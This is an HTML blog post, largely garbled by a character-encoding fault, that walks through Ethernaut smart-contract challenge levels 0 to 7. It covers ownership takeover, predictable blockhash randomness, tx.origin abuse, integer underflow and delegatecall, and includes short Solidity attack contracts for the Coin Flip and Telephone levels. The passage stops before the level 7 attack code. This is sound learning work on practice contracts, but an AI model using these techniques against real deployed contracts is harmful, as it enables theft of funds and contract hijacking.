<!DOCTYPE html>
<html lang="zn-Ch">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Fantome">





<title>BlockChain Learning Blog 2 | Fantome&#39;s Blog</title>



    <link rel="icon" href="/project/Deep%20River.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/project/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/project/js/script.js"></script>
    
    <script src="/project/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "Â· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "Â· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/project/">Fantome&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/project/archives">Posts</a>
                
                    <a class="menu-item" href="/project/category">Categories</a>
                
                    <a class="menu-item" href="/project/tag">Tags</a>
                
                    <a class="menu-item" href="/project/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/project/">Fantome&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/project/archives">Posts</a>
                
                    <a class="menu-item" href="/project/category">Categories</a>
                
                    <a class="menu-item" href="/project/tag">Tags</a>
                
                    <a class="menu-item" href="/project/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // ä¸º 6 æ—¶å±•å¼€æ‰€æœ‰
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // è¿™ä¸ªå€¼æ˜¯ç”± tocbot æºç é‡Œå®šä¹‰çš„ scrollSmoothDuration å¾—æ¥çš„
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">BlockChain Learning Blog 2</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Fantome</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">July 26, 2024&nbsp;&nbsp;18:29:38</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><ol>
<li><p>æ³¨å†ŒMetaMaské’±åŒ…ï¼Œä¿å­˜å¥½12ä¸ªå•è¯</p>
</li>
<li><p>å¯åŠ¨<a target="_blank" rel="noopener" href="https://sepolia-faucet.pk910.de/%E6%8C%96%E6%B5%8B%E8%AF%95%E5%B8%81">https://sepolia-faucet.pk910.de/æŒ–æµ‹è¯•å¸</a></p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240409204713595.png" alt="image-20240409204713595"></p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240409224755337.png" alt="image-20240409224755337"></p>
</li>
</ol>
<hr>
<h1 id="æ­£å¼åšé¢˜"><a href="#æ­£å¼åšé¢˜" class="headerlink" title="æ­£å¼åšé¢˜"></a>æ­£å¼åšé¢˜</h1><h3 id="0-Hello-Ethernaut"><a href="#0-Hello-Ethernaut" class="headerlink" title="0. Hello Ethernaut"></a>0. Hello Ethernaut</h3><p>é€šè¿‡ä¸æ–­çš„<code>await contract.___()</code>è·å–ä¸‹ä¸€æ­¥çš„ä¿¡æ¯,å†ä¸çŸ¥æ‰€äº‘çš„æµªè´¹äº†ä¸¤æ¬¡æµ‹è¯•å¸ä¹‹åå®Œæˆäº†ç¬¬0é¢˜.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240409235136447.png" alt="image-20240409235136447"></p>
<h3 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h3><p>æœ¬å…³æœ‰2ä¸ªé€šå…³è¦æ±‚:</p>
<ol>
<li>è·å¾—åˆçº¦çš„æ‰€æœ‰æƒ</li>
<li>æ¸…ç©ºåˆçº¦çš„ä½™é¢</li>
</ol>
<p>è¯»æºç å¯ä»¥çŸ¥é“, æœ‰ä¸¤ä¸ªå˜æ›´åˆçº¦æ‰€æœ‰æƒçš„å…¥å£, åˆ†åˆ«æ˜¯<code>contribute()</code>å’Œ<code>receive()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯<code>contribute()</code>éœ€è¦senderçš„valueå¤§äºowner, ä½†æ˜¯è¿™éœ€è¦senderçš„contributionå¤§äºownerçš„<code>1000 * (1 ether)</code>, è¿™éœ€è¦ä¸æ–­åœ°è°ƒç”¨<code>contribute()</code>, æ˜¾ç„¶æ˜¯éš¾ä»¥å®ç°çš„.</p>
<p>æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©<code>receive()</code>æ–¹æ³•, å³å…ˆè°ƒç”¨ä¸€æ¬¡<code>contribute()</code>, ä½¿æˆ‘çš„value &gt; 0, å†ä½¿ç”¨<code>sendTransaction()</code>æ„é€ è½¬è½½äº¤æ˜“å‘é€ç»™åˆçº¦, ä½¿æ»¡è¶³<code>receive()</code>çš„è°ƒç”¨è¦æ±‚<code>msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0</code>, è‡³æ­¤, ä¹Ÿå°±æ‹¥æœ‰äº†åˆçº¦çš„æ‰€æœ‰æƒ.</p>
<p>å†ä½¿ç”¨<code>withdraw()</code>å–å‡ºä½™é¢å³å¯.</p>
<p>![](C:\Users\wjx27\Pictures\Screenshots\å±å¹•æˆªå›¾ 2024-04-10 190843.png)</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240410190852617.png" alt="image-20240410190852617"></p>
<h3 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h3><p>æœ¬å…³è¦æ±‚è·å–åˆçº¦çš„æ‰€æœ‰æƒ</p>
<p>æ ¹æ®æç¤º<code>Fal1out</code>æ‰¾åˆ°ä»¥ä¸‹æºä»£ç :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// constructor</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>æŸ¥æ‰¾èµ„æ–™å¾—åˆ°, å¯¹äºSolidityæ¥è¯´, 0.4.22å‰çš„ç¼–è¯‘å™¨ç‰ˆæœ¬æ”¯æŒåŒåˆçº¦åçš„æ„é€ å‡½æ•°, ä½†åœ¨æœ¬é¢˜ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br></pre></td></tr></table></figure>

<p>è€Œé«˜äº0.4.22ç‰ˆæœ¬, åªæ”¯æŒåˆ©ç”¨<code>constructor()</code>æ„å»º.</p>
<p>è€Œåœ¨è¯¥åˆåŒçš„æºç ä¸­, å…¶è¯•å›¾ç”¨å’Œåˆçº¦åç§°ç›¸åŒçš„å‡½æ•°å……å½“æ„é€ å‡½æ•°, å‡ºç°äº†é”™è¯¯, å°†<code>Fallout()</code>å†™æˆäº†<code>Fal1out()</code>, ä½¿å¾—å…¶ä»–äººå¯ä»¥é‡å¤è°ƒç”¨<code>Fal1out()</code>, è·å–åˆçº¦æ‰€æœ‰æƒ.</p>
<p>ä½†æ˜¯åœ¨åšé¢˜çš„æ—¶å€™å‡ºç°äº†ä¸€ç‚¹é—®é¢˜, æ‰§è¡Œ<code>contract.owner===player</code>çš„ç»“æœæ˜¯<code>false</code>, ä½†æ˜¯onwerçš„åœ°å€å’Œplayerçš„åœ°å€æ˜¯ç›¸åŒçš„,ä¸”submitä¹ŸæˆåŠŸäº†.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240410200611886.png" alt="image-20240410200611886"></p>
<h3 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h3><p>æœ¬å…³è¦æ±‚è¿ç»­çŒœå¯¹10æ¬¡ç¡¬å¸çš„æ­£åé¢ (å¾ˆæ˜¾ç„¶åªèƒ½é æˆ‘å¼ºå¤§çš„å åœèƒ½åŠ›bushi</p>
<p>æºç ä¸­coinflipçš„ç»“æœæ˜¯æ ¹æ®ä»¥ä¸‹ä»£ç å†³å®šçš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">       if (lastHash == blockValue) &#123;</span><br><span class="line">           revert();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       lastHash = blockValue;</span><br><span class="line">       uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">       bool side = coinFlip == 1 ? true : false;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“, è¦è·å–ç¡¬å¸çš„æ­£åé¢ç»“æœéœ€è¦ç¡®å®š<code>blockValue</code>çš„å€¼, å³åŒºå—é«˜åº¦, è€Œæ”»å‡»ç‚¹åœ¨åŒºå—ä¸­çš„æ•°æ®éƒ½æ˜¯å…±äº«ä¸”ç¡®å®šçš„, æ‰€æœ‰æˆ‘ä»¬å¯ä»¥ç¼–å†™æ”»å‡»åˆçº¦å»è°ƒç”¨<code>victim</code>åˆçº¦ (å³æœ¬å…³åˆçº¦), è¿™æ ·åœ¨æ¯ä¸€æ¬¡çš„äº¤æ˜“ä¸­æäº¤åˆ°åŒºå—, å…¶åŒºå—é«˜åº¦éƒ½æ˜¯ä¸€æ ·çš„, å†é€šè¿‡å¤åˆ»<code>flip()</code>, è®¡ç®—ç¡¬å¸çš„æ­£åé¢ç»“æœå³å¯. </p>
<p>æ”»å‡»åˆçº¦ä»£ç :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlipInterface &#123;</span><br><span class="line">    function flip(bool _guess) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FlipCoin &#123;</span><br><span class="line"></span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    CoinFlipInterface victim;</span><br><span class="line"></span><br><span class="line">    constructor(address _victim) &#123;</span><br><span class="line">        victim = CoinFlipInterface(_victim);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Attack() public returns (bool) &#123;</span><br><span class="line">        bool guess_ = guess();</span><br><span class="line">        return victim.flip(guess_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess() public view returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        return side;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411123824547.png" alt="image-20240411123824547"></p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411122303911.png" alt="image-20240411122303911"></p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411124353090.png" alt="image-20240411124353090"></p>
<p>è¿ç»­æ”»å‡»åæ¬¡ä¹‹å</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411124414587.png" alt="image-20240411124414587"></p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411124452998.png" alt="image-20240411124452998"></p>
<h3 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h3><p>æœ¬å…³è¦æ±‚è·å–åˆåŒçš„æ‰€æœ‰æƒ</p>
<p>æ ¹æ®æºç å¯å¾—çªç ´å£:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åˆ™éœ€è¦ç¼–å†™æ”»å‡»åˆçº¦ä½¿<code>tx.origin</code>ä¸<code>msg.sender</code>ä¸ç­‰.</p>
<p>[^tx.origin]: Solidityçš„ä¸€ä¸ªå…¨å±€å˜, å®ƒéå†æ•´ä¸ªè°ƒç”¨æ ˆå¹¶è¿”å›æœ€åˆå‘é€è°ƒç”¨(æˆ–äº‹åŠ¡)çš„å¸æˆ·çš„åœ°å€.<br>[^msg.sender]: ç›´æ¥è°ƒç”¨æ™ºèƒ½åˆçº¦çš„åŠŸèƒ½çš„è´¦æˆ·æˆ–è€…æ™ºèƒ½åˆçº¦çš„åœ°å€</p>
<p>å› æ­¤å½“åŒä¸€ç¬”äº¤æ˜“ä¸­æœ‰å¤šç¬”è°ƒç”¨æ—¶, <code>tx.origin</code>ä¿æŒä¸å˜, è€Œ<code>msg.sender</code>åˆ™ä¼šæ”¹å˜, æ ¹æ®æ­¤åŸç†ç¼–å†™æ™ºèƒ½åˆçº¦, å°†è¯¥åˆçº¦ä½œä¸ºä¸­é—´äººå±•å¼€æ”»å‡».</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface TelephoneInterface &#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    TelephoneInterface tele;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        tele = TelephoneInterface(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _owner) public &#123;</span><br><span class="line">        tele.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411142902274.png" alt="image-20240411142902274"></p>
<p>è°ƒç”¨<code>attack()</code>, å¹¶å°†å‚æ•°è®¾ä¸ºMetaMaskçš„åœ°å€, ä½¿<code>tx.origin</code>ä¸<code>msg.sender</code>ä¸ç­‰, å°±å¯ä»¥å°†åˆçº¦çš„æ‰€æœ‰æƒå‘ç”Ÿå˜æ›´.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411142705985.png" alt="image-20240411142705985"></p>
<h3 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h3><p>æœ¬å…³è¦æ±‚åœ¨æœ€åˆæ‹¥æœ‰20tokensçš„åŸºç¡€ä¸Š,è·å¾—ä»»æ„æ•°é‡çš„token.</p>
<p>æ ¹æ®æºç æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°çªç ´å£æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œæœ‰ä¸€ä¸ªç¼–å†™é”™è¯¯, å³<code>uint256</code>æ²¡æœ‰åšæº¢å‡ºæ£€æŸ¥, ä¼šäº§ç”Ÿ<code>0-1=255</code>å’Œ<code>255+1=0</code>çš„é”™è¯¯, é€šè¿‡è¿™æ ·çš„é”™è¯¯, æˆ‘ä»¬å¯ä»¥å®ç°tokençš„å¢åŠ .</p>
<p>å› æ­¤, æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘åˆçº¦è½¬è´¦21tokens, ä½¿å¾—å‘ç”Ÿ<code>20-21=255</code>çš„å‘ä¸‹æº¢å‡º, è·å–å¤§é‡tokens.</p>
<p>PS: åœ¨æŸ¥æ‰¾èµ„æ–™æ—¶å‘ç°äº†<code>SafeMath</code>åº“, å…¶åŠŸèƒ½å°±æ˜¯ä¸ºäº†é¿å…ç¨‹åºçš„ç»“æœå‡ºç°æº¢å‡º, ä¸æœ¬å…³æ¼æ´çš„ä¿®å¤ç›¸å¯¹å¥‘åˆ.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240411172400505.png" alt="image-20240411172400505"></p>
<h3 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h3><p>æœ¬å…³è¦æ±‚è·å¾—åˆçº¦<code>Delegation</code>çš„æ‰€æœ‰æƒ.</p>
<p>æ ¹æ®æºç å¯ä»¥å‘ç°<code>Delegate</code>çš„ä¸­æ‰€æœ‰æƒå˜æ›´çš„ä»£ç :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬å‘ç°<code>Delegation</code>æ²¡æœ‰æ‰€æœ‰æƒå˜æ›´çš„ä»£ç , è¿™æ—¶å€™æ ¹æ®æç¤ºæˆ‘ä»¬å»äº†è§£<code>delegatecall</code>ä½çº§å‡½æ•°.</p>
<p>callå‡½æ•°ç°‡ç”¨äºå®ç°è·¨åˆçº¦çš„å‡½æ•°è°ƒç”¨åŠŸèƒ½, åŒ…æ‹¬ä»¥ä¸‹ä¸‰ç§:</p>
<ul>
<li><strong>call</strong> : æœ€å¸¸ç”¨çš„è°ƒç”¨æ–¹å¼, è°ƒç”¨åå†…ç½®å˜é‡msgçš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…, æ‰§è¡Œç¯å¢ƒä¸ºè¢«è°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒ(åˆçº¦çš„storage).</li>
<li><strong>delegatecall</strong> : è°ƒç”¨åå†…ç½®å˜é‡msgçš„å€¼ä¸ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…, ä½†æ‰§è¡Œç¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒ.</li>
<li><strong>callcode</strong> : è°ƒç”¨åå†…ç½®å˜é‡msgçš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…, ä½†æ‰§è¡Œç¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒ.</li>
</ul>
<p>ä»¥ç”¨æˆ·Aé€šè¿‡Båˆçº¦è°ƒç”¨Cåˆçº¦ä¸¾ä¾‹è¯´æ˜ä¸‰è€…åŒºåˆ«: </p>
<ul>
<li><strong>call</strong> : è°ƒç”¨å, å†…ç½®å˜é‡msgçš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…B, æ‰§è¡Œç¯å¢ƒä¸ºè¢«è°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒC.</li>
<li><strong>delegatecall</strong> : è°ƒç”¨å, å†…ç½®å˜é‡msgçš„å€¼Aä¸ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…, æ‰§è¡Œç¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒB.</li>
<li><strong>callcode</strong> : è°ƒç”¨å, å†…ç½®å˜é‡msgçš„å€¼ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…B, æ‰§è¡Œç¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒB.</li>
</ul>
<p>å› æ­¤å°±å¯ä»¥æ‰¾åˆ°åˆçº¦<code>Delegation</code>çš„çªç ´å£:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å½“åœ¨è°ƒç”¨<code>fallback</code>å‡½æ•°æ—¶, è™½ç„¶è°ƒç”¨çš„æ˜¯<code>delegate</code>é‡Œçš„å‡½æ•°, ä½†æ˜¯æ˜¯åœ¨<code>Delegation</code>ç¯å¢ƒä¸­è°ƒç”¨çš„, å› æ­¤å¯ä»¥å®Œæˆåˆçº¦<code>Delegation</code>çš„æ‰€æœ‰æƒè½¬è®©.</p>
<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240413112004395.png" alt="image-20240413112004395"></p>
<h3 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h3><p>æœ¬å…³çš„ç›®æ ‡æ˜¯ä½¿åˆçº¦çš„ä½™é¢å¤§äºé›¶.</p>
<p>è¿™ä¼¼ä¹ç…§ç†æ¥è¯´åº”è¯¥å¾ˆç®€å•ï¼Œä½†æ˜¯è¯»å®Œæºç çš„æˆ‘frozenäº†:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123; /*</span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">    /~____  =Ã¸= /</span><br><span class="line">    (______)__m_m)</span><br><span class="line">                   */ &#125;</span><br></pre></td></tr></table></figure>

<p>ç©ºæœ‰contract, éš¾ä¸æˆæ˜¯ç¥å¥‡çš„æ³¨é‡Šå¤§æ³•?</p>
<blockquote>
<p>åœ¨å®é™…ä¸­ï¼Œå¦‚æœè¦ç»™æ™ºèƒ½åˆçº¦è½¬è´¦ï¼Œæœ‰å‡ ç§å¸¸è§æ–¹æ³•ã€‚</p>
<p>Transfer: Throws exception when an error occurs, and the code will not execute afterward<br>Send: The transfer error does not throw an exception and returns true&#x2F;false. The code will continue to execute.<br>call.value().gas: Transfer error does not throw an exception and returns true&#x2F;false. The code will execute, but call functions for transfer are prone to reentrancy attacks.</p>
<p>ä¸‰ç§æ–¹å¼å­˜åœ¨ä¸€ä¸ªå‰æï¼Œå³æ¥å—åˆçº¦å¿…é¡»èƒ½å¤Ÿæ¥å—è½¬è´¦ï¼Œå³å­˜åœ¨payableå‡½æ•°ï¼Œå¦åˆ™å°†ä¼šå›é€€ã€‚</p>
</blockquote>
<p>æ²¡æœ‰payableå‡½æ•°çš„æƒ…å†µä¸‹, æ ¹æ®æç¤º, æ˜¯éœ€è¦æˆ‘ä»¬è‡ªå·±ç¼–å†™æ”»å‡»åˆåŒ, è€Œè¿™æ—¶æˆ‘ä»¬å¼•å…¥<strong>è‡ªæ¯åˆçº¦</strong>çš„æ¦‚å¿µ</p>
<p>æ”»å‡»åˆçº¦:</p>
